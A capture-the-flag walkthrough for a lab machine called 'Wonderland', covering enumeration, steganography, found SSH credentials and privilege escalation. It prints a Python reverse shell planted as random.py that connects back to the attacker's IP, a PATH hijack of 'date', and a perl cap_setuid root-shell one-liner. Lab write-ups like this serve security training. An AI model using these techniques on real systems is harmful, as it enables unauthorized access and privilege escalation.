@@ -1,0 +1,226 @@
+Wonderland
+
+{{NMAP SCAN}}
+
+nmap -sV -T4 [machine IP] -p-
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-28 14:20 EST
+Nmap scan report for [machine IP]
+Host is up (0.13s latency).
+Not shown: 65531 closed ports
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+21113/tcp filtered unknown
+39568/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+{{GOBUSTER RESULTS}}
+
+gobuster -u [machine IP] path/to/wordlist.txt -t 250
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.72.28/
+[+] Threads      : 250
+[+] Wordlist     : /home/techtyte/thm/dirbcommon.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2022/01/28 14:36:33 Starting gobuster
+=====================================================
+/img (Status: 301)
+/index.html (Status: 301)
+/r (Status: 301)
+
+
+Going to http://[machine IP]/r/ only reveals a short message:
+Keep Going.
+
+"Would you tell me, please, which way I ought to go from here?"
+
+
+
+{{STEGO}}
+
+When viewing the source code of the page, there is a path to the image of the white rabbit:
+<img src="/img/white_rabbit_1.jpg" 
+
+Going to [machine IP]\img\, we are presented with three different images. Save each one.
+alice_door.jpg
+alice_door.png
+white_rabbit_1.jpg
+
+Next, let's see if there is anything hidden in these files that we can extract:
+steghide extract -sf white_rabbit_1.jpg
+
+We successfully extract a file called "hint.txt". Opening it reveals:
+follow the r a b b i t
+
+
+Next file:
+binwalk alice_door.png
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 1962 x 1942, 8-bit/color RGBA, non-interlaced
+91            0x5B            Zlib compressed data, compressed
+
+We can extract some data from it, but I wasn't able to really do anything with it.
+binwalk -e alice_door.png
+
+Since I had nothing else to go on, I decided to try and find any other hidden files or pages.
+
+First, I tried [machine IP]/r/a
+And we get a hit:
+Keep Going.
+"That depends a good deal on where you want to get to," said the Cat.
+
+Keep going, appending /b/b/i/ and /t/, and altogether we get:
+
+/b/"I don’t much care where—" said Alice.
+/b/"Then it doesn’t matter which way you go," said the Cat.
+/i/"—so long as I get somewhere,"" Alice added as an explanation.
+/t/"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."
+Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
+"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
+
+View the source code of this last page, and we get some credentials:
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+Let's plug that into ssh:
+ssh alice@[machine IP]
+It works!
+
+In alice's home folder, we see two files
+root.txt - which we cannot view yet and
+walrus_and_the_carpenter.py, which appears to be a script that will give you randomized lines from a poem.
+
+However, if we check our sudo rights, we see:
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+    
+We can run this script as user rabbit as alice.
+
+
+    
+Possibly something. Let's check SUID as well:
+
+find / -type f -perm -04000 -ls 2>/dev/null
+   394282     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   394475     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   394471    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+   524949    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+   394289     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   393716     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+   393920     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+   394097     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+   393714     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+   393936     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+   393809     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+   393919     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+   393663     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+   393918     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+   393956     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+   394061    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+   655427     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+   655971     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount
+   655478     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+   655970     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount
+   655494     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+   
+   Nothing.
+
+The only library it imports is random, so perhaps there is a way to leverage that and escalate our privilege.
+https://rastating.github.io/privilege-escalation-via-python-library-hijacking/ has more information on this type of privesc.
+
+By default, the script will search it's own folder first for libraries before checking a set of different paths. 
+(which you can check by running: python3.6 -c 'import sys; print("\n".join(sys.path))')
+
+Since we can create new files in our home folder, where the python script is located, we are in luck.
+Let's begin by creating a script called "random.py"
+touch random.py
+
+I used the reverse python shell found here: https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7 :
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("[your IP]",[port]))
+
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+p=subprocess.call(["/bin/sh","-i"])
+
+Start a listener on your own machine: nc -lvnp [port]
+
+And to execute the script, type it out like so:
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+Catch the shell. 
+
+Running whoami will reveal we are now user "rabbit".
+
+Navigate to our home folder in /home/rabbit/, and see that the only file in it is something called teaParty.
+We can execute it: ./teaParty
+
+Probably by Sun, 30 Jan 2022 19:25:34 +0000
+
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Ask very nicely, and I will give you some tea while you wait for him
+Segmentation fault (core dumped)
+
+It also appears to have SUID set:
+find / -type f -perm -04000 -ls 2>/dev/null
+  1049052     20 -rwsr-sr-x   1 root     root        16816 May 25  2020 /home/rabbit/teaParty
+
+Looking further into teaParty, we discover this line: The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour'
+"date" appears to not have a path included. 
+
+export PATH=/home/rabbit/:$PATH
+echo $PATH
+/home/rabbit/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+Now, if something doesn't have an absolute defined path, it will check /home/rabbit/ first.
+
+For our own malicious date file, we will do:
+echo "#!/bin/bash" > date
+echo /bin/bash >> date
+
+Let's make it executable with: chmod +x date
+Execute the script: ./teaParty
+
+whoami now reveals we are the user "hatter!"
+
+In hatter's home folder, there is one file called "password.txt," which contains the login password for this user.
+ssh into it for a better shell.
+
+Running sudo -l only informs us that we may not run sudo on wonderland. SUID? ...doesnt reveal anything useful.
+What about capabilities?
+getcap -r / 2>/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+perl looks interesting, let's check gtfobins:
+
+Capabilities:
+
+If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+    cp $(which perl) .
+    sudo setcap cap_setuid+ep perl
+
+    ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+
+With this, head to /usr/bin/, and we are going to execute just the last line from gtfobins:
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+Congratulations! user.txt is in /root/ and root.txt is in /home/alice/!
